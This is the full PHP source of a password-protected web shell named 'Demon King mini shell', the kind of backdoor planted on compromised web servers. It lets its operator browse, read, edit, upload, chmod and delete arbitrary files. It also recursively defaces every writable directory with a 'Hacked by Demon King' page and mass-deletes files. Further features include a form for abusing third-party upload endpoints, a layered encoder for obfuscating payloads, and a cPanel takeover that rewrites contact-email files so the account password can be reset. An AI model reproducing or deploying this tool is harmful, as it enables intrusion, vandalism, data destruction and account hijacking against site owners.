<?php
$pass = "a67ad812bf17cb5ebbc5864d7fa214d0";
session_start();
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html>
<head>
<meta name="robots" content="NOINDEX. NOFOLLOW">
<meta name="theme-color" content="#434343">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1256" />
<link href="https://fonts.googleapis.com/css2?family=Metal+Mania&display=swap" rel="stylesheet"></head><body>
<?php
if (!empty($_GET['AsmID']) &&  $_GET['AsmID'] == "logout") {session_destroy();unset ($_SESSION['pass']);}

$path_name = pathinfo($_SERVER['PHP_SELF']);
$this_script = $path_name['basename'];
if (empty($_SESSION['pass'])) {$_SESSION['pass']='';}
if (empty($_POST['pass'])) {$_POST['pass']='';}
if ( $_SESSION['pass']!== $pass) 
{
    if (md5($_POST['pass']) == $pass) {$_SESSION['pass'] = $pass; }
    else 
    {
        echo '<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
	<meta charset="utf-8">
	<title> Login </title>
	<style>
*{
    padding: 0; margin: 0;
}
body{
background-color:#434343;
}
form {
    border: 3px solid black;
    font-family: arial;
    width: 400px;
    margin: auto;
}

input[type=text], input[type=password] {
    width: 100%;
    padding: 12px 20px;
    margin: 8px 0;
    display: inline-block;
    border: 3px solid #ccc;
    box-sizing: border-box;
}
label{
	color:white;
	text-transform: uppercase;
}
button {
    background-color: red;
    color: white;
    padding: 14px 20px;
    margin: 8px 0;
    border: none;
    border-radius:4px;
    cursor: pointer;
    width: 100%;
    font-family: "Metal Mania", cursive;
    font-size:20px;
}

button:hover {
    opacity: 0.8;
}
.imgcontainer {
    text-align: center;
}

img.avatar {
    width: 100%;
}

.container {
    padding: 16px;
}

span.psw {
    float: right;
    padding-top: 16px;

}
span{
	color:white;
	font-family: "Metal Mania", cursive;
	font-size:25px;
}
/* Change styles for span and cancel button on extra small screens */
@media screen and (max-width: 200px) {
    span.psw {
       display: block;
       float: none;
    }
    .cancelbtn {
       width: 100%;
    }
}
a{
color:white;
text-decoration: none;
}
</style>
</head>
<body>'; ?>
<?php
	echo '<form action="'.$_SERVER['PHP_SELF'].'" method="post">'; ?>
<div class="imgcontainer">
<img src="https://e.top4top.io/p_20610d2h70.jpg"width="250"height="250"><br><br>
<span>Ganest_Seven</span>
</div>
  <div class="container">
    <input type="password" placeholder="Enter Password" name="pass" required>
    <button type="submit">Login</button>
  </div>
</span>
  </div>
<?php
echo '</form>
</body>
</html> ';
        exit;
    }
}
?>
<?php
error_reporting(0);
set_time_limit(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<html>
<head>
<link href="" rel="stylesheet" type="text/css">
<title>Demon King mini shell</title>
<link href="https://fonts.googleapis.com/css2?family=Metal+Mania&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=Philosopher&display=swap" rel="stylesheet">
<link rel="icon" href="" type="image/jpeg">
<style>
body{
font-family: "Philosopher", sans-serif;
background-color:#1E1E1E;
color:white;
}
#content tr:hover{
background-color:#434343;
}
.AsmID {
background-color:#434343;
}
.pejoe {
background: #434343;
padding:6px 6px;
border-radius:6px;
}
.pejoe:hover {
background-color:#F30A00;
color:#FFFFFF;
}
.asm_id {
background: transparent;
}
.asm_id:hover {
background-color: transparent;
color:#FF2100;
}
.we {
color: red;
font-size: 35px;
font-family: "Metal Mania", cursive;
text-shadow: 0px 2px 0px #8A8A8A;
}
table{
border: 3px white solid;
border-radius:4px;
}
a{
color:white;
text-decoration: none;
}
a:hover{
color:white;
}
input, select, textarea, option{
border: 3px #7B7B7B solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:4px;
padding:2px;
font-family: "Metal Mania", cursive;
color:red;
background:transparent;
}
span{
	color:red;
	font-family: "Metal Mania", cursive;
	font-size:25px;
}
</style>
</head>
<body>
<center><img src="https://i.ibb.co/k6M6K7V/Pics-Art-07-05-05-25-10.jpg"width="250"height="250"><br><span class="we"><a href="?" class="asm_id">Demon King</a></span></center>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>Path : ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/ ';
}
echo "</td></tr><tr><td>";
echo "<center><hr><a href='?' class='pejoe'>Home</a>
<a href='?path=$path&AsmID=mass_deface' class='pejoe'>Mass Deface</a>
<a href='?path=$path&AsmID=mass_delete' class='pejoe'>Mass Delete</a>
<a href='?path=$path&AsmID=newfile' class='pejoe'>New File</a>
<a href='?path=$path&AsmID=newfolder' class='pejoe'>New Folder</a>
<a href='?path=$path&AsmID=upload' class='pejoe'>Upload</a>
<a href='?path=$path&AsmID=endecode' class='pejoe'>Encode/Decode</a>
<a href='?path=$path&AsmID=csrf' class='pejoe'>CSRF</a><br><br>
<a href='?path=$path&AsmID=cpanel' class='pejoe'>Reset Cpanel</a>
<a href='?path=$path&AsmID=about' class='pejoe'>About</a>
<a href='?AsmID=logout' class='pejoe'>Logout</a></center><hr>
";
echo "</tr></td>";
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="lime">Change Permission Berhasil</font><br/>';
}else{
echo '<font color="white">Change Permission Gagal</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="lime">Ganti Nama Berhasil</font><br/>';
}else{
echo '<font color="white">Ganti Nama Gagal</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="lime">Berhasil Edit File</font><br/>';
}else{
echo '<font color="white">Gagal Edit File</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="lime">Directory Terhapus</font><br/>';
}else{
echo '<font color="white">Directory Gagal Terhapus                                                                                                                                                                                                                                                                                             </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="lime">File Terhapus</font><br/>';
}else{
echo '<font color="white">File Gagal Dihapus</font><br/>';
}
}
}
// upload
elseif($_GET['AsmID'] == 'upload'){
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="lime">Upload Berhasil</font><br />';
}else{
echo '<font color="white">Upload Gagal</font><br/>';
}
}
echo '<form enctype="multipart/form-data" method="POST">
<input type="file" name="file" />
<input type="submit" value="upload" />
</form><br>';
}
// about
elseif($_GET['AsmID'] == 'about'){
echo "<center>
<a style='text-decoration:none;' href='mailto:admin@zphcrew.com'>Email</a><br>
<a style='text-decoration:none;' href='https://instagram.com/zphcrew'>Instagram</a><br>
</center><br>";
}
// mass deface
elseif($_GET['AsmID'] == 'mass_deface') {
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font color='aqua'>Tipe Mass Deface:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font color='red'>Folder:</font><br>
	<input type='text' name='d_dir' value='$path' style='width: 450px;' height='10'><br>
	<font color='red'>Filename:</font><br>
	<input type='text' name='d_file' value='AsmID.html' style='width: 450px;' height='10'><br>
	<font color='red'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked by Demon King</textarea><br>
	<input type='submit' name='start' value='Mass Deface' style='width: 450px;'><br><br><br>
	</form></center>";
	}
}
// mass delete
 elseif($_GET['AsmID'] == 'mass_delete') {
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=red>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		hapus_massal($_POST['d_dir'], $_POST['d_file']);
		echo "</div>";
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font color='red'>Folder:</font><br>
	<input type='text' name='d_dir' value='$path' style='width: 450px;' height='10'><br>
	<font color='red'>Filename:</font><br>
	<input type='text' name='d_file' value='AsmID.php' style='width: 450px;' height='10'><br>
	<input type='submit' name='start' value='Mass Delete' style='width: 450px;'> <br><br><br>
	</form></center>";
	}
}
// create file
elseif($_GET['AsmID'] == 'newfile') {
	if($_POST['new_save_file']) {
		$newfile = htmlspecialchars($_POST['newfile']);
		$fopen = fopen($newfile, "a+");
		if($fopen) {
			$act = "<script>window.location='?option&path=".$path."/".$_POST['newfile']."';</script>";
		} else {
			$option = "<font color=red>permission denied</font>";
		}
	}
	echo $option;
	echo "<form method='post'>
	<font color='red'>Filename:</font> <input type='text' name='newfile' value='$path/newfile.php' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_file' value='Submit'>
	</form><br>";
}
// create dir / folder
 elseif($_GET['AsmID'] == 'newfolder') {
	if($_POST['new_save_folder']) {
		$new_folder = $path.'/'.htmlspecialchars($_POST['newfolder']);
		if(!mkdir($new_folder)) {
			$option = "<font color=red>permission denied</font>";
		} else {
			$act = "<script>window.location='?path=".$path."';</script>";
		}
	}
	echo $option;
	echo "<form method='post'>
	<font color='red'>Folder Name:</font> <input type='text' name='newfolder' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_folder' value='Submit'>
	</form><br>";
}
// csrf exploiter
elseif($_GET['AsmID'] == 'csrf'){
	echo '<html>
	<form method="post" style="font-size:20px;">
	<font color="red">URL:</font> <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/path/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
	<font color="red">POST File:</font> <input type="text" name="pf" size="50" height="10" placeholder="uploadfile / files[] / qqfile / dll" style="margin: 5px auto; padding-left: 5px;" required><br>
	<input type="submit" name="d" value="Lock!">
	</form><br><br>';
	$url = $_POST["url"];
	$pf = $_POST["pf"];
	$d = $_POST["d"];
	if($d) {
		echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Upload'></form></form><br>
		</html>";
	}
}
// encode / decode
elseif($_GET['AsmID'] == 'endecode') {
	$text = $_POST['code'];
$submit = $_POST['submit'];
if (isset($submit)){
$op = $_POST["ope"];
switch ($op) {case 'base64': $codi=base64_encode($text);
break;case 'str' : $codi=(base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
break;case 'json' : $codi=json_encode(utf8_encode($text));
break;case 'gzinflate' : $codi=base64_encode(gzdeflate(str_rot13($text)));
break;case 'gzinflater' : $codi=base64_encode(str_rot13(gzdeflate($text)));
break;case 'gzinflatex' : $codi=base64_encode(gzdeflate(str_rot13(gzdeflate($text))));
break;case 'gzinflatew' : $codi=base64_encode(gzdeflate(str_rot13(rawurlencode(gzdeflate(convert_uuencode(base64_encode(str_rot13(gzdeflate(convert_uuencode(rawurldecode(str_rot13($text))))))))))));
break;case 'gzinflates' : $codi=base64_encode(gzdeflate($text));
break;case 'str2' : $codi=base64_encode(str_rot13($text));
break;case 'urlencode' : $codi=rawurlencode($text);
break;case 'ur' : $codi=convert_uuencode($text);
break;case 'url' : $codi=base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))));
break;default:break;}}

$submit = $_POST['submits'];
if (isset($submit)){
$op = $_POST["ope"];
switch ($op) {case 'base64': $codi=base64_decode($text);
break;case 'str' : $codi=str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
break;case 'json' : $codi=utf8_dencode(json_dencode($text));
break;case 'gzinflate' : $codi=str_rot13(gzinflate(base64_decode($text)));
break;case 'gzinflater' : $codi=gzinflate(str_rot13(base64_decode($text)));
break;case 'gzinflatex' : $codi=gzinflate(str_rot13(gzinflate(base64_decode($text))));
break;case 'gzinflatew' : $codi=str_rot13(rawurldecode(convert_uudecode(gzinflate(str_rot13(base64_decode(convert_uudecode(gzinflate(rawurldecode(str_rot13(gzinflate(base64_decode($text))))))))))));
break;case 'gzinflates' : $codi=gzinflate(base64_decode($text));
break;case 'str2' : $codi=str_rot13(base64_decode($text));
break;case 'urlencode' : $codi=rawurldecode($text);
break;case 'ur' : $codi=convert_uudecode($text);
break;case 'url' : $codi=base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(($text)))))));
break;default:break;}}
$html = htmlentities(stripslashes($codi));
echo '
<form method="post"><br>
<textarea cols=80 rows=10 name="code"></textarea><br><br>
<select size="1" name="ope">
<center><option value="urlencode">url</option>
<option value="base64">Base64</option>
<option value="ur">convert_uu</option>
<option value="gzinflates">gzinflate - base64</option>
<option value="str2">str_rot13 - base64</option>
<option value="gzinflate">str_rot13 - gzinflate - base64</option>
<option value="gzinflater">gzinflate - str_rot13 - base64</option>
<option value="gzinflatex">gzinflate - str_rot13 - gzinflate - base64</option>
<option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
<option value="url">base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option></center>
</select>&nbsp;<br><br><input type="submit" name="submit" value="Encode">
<input type="submit" name="submits" value="Decode">
</form>
<br>';
echo "</from><textarea cols=80 rows=10>".$html."</textarea><BR/><BR/></center><br></from>";
}
// cpanel reset password
elseif($_GET['AsmID'] == 'cpanel'){
echo '<font color="red" size="5"><b>Reset Password Cpanel</b></font><br>
	<p>   
	    <form action="#" method="post">
	    <b> Email : </b>
	<input type="email" name="email">
	<input type="submit" name="submit" value="Send">
	
	</form>
	</p>
	<br>';

$user = get_current_user();
$site = $_SERVER['HTTP_HOST'];
$ips = getenv('REMOTE_ADDR');

if(isset($_POST['submit'])){
	
	$email = $_POST['email'];
	$wr = 'email:'.$email;
$f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
fwrite($f, $wr); 
fclose($f);
$f = fopen('/home/'.$user.'/.contactinfo', 'w');
fwrite($f, $wr); 
fclose($f);
$parm = $site.':2083/resetpass?start=1';
echo '<center><hr color="green">Done by Demon King<br><a href="'.$parm.'">Klik disini</a></center><hr color="green"><br><br>';
}
}


echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center" color="black">
<tr class="first">
<td><center>Name</peller></center></td>
<td><center>Size</peller></center></td>
<td><center>Permission</peller></center></td>
<td><center>Modify</peller></center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="white">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="white">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="white">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="white">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<center><span>Coded by Asmodeus ID</span></center>
</body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
